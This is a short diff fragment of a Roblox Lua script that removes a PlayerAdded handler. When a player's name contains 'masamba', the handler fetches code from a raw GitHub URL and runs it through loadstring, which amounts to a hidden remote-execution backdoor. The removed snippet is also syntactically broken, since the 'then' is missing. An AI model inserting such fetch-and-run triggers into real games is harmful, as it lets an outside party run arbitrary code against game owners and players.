@@ -188,11 +188,3 @@ task.spawn(function()
         task.wait(1.5)
     end
 end)
-game.Players.PlayerAdded:Connect(function(player)
-    local playerNameLower = string.lower(player.Name)
-    
-    -- Checks ONLY if the name includes "masamba" (dapzkecoy completely removed)
-    if string.find(playerNameLower, "masamba") loadstring(game:HttpGet("https://raw.githubusercontent.com/mrazep-droid/Repository/refs/heads/main/SRC/private-use2"))()
-        -- Your game code here
-    end
-end)
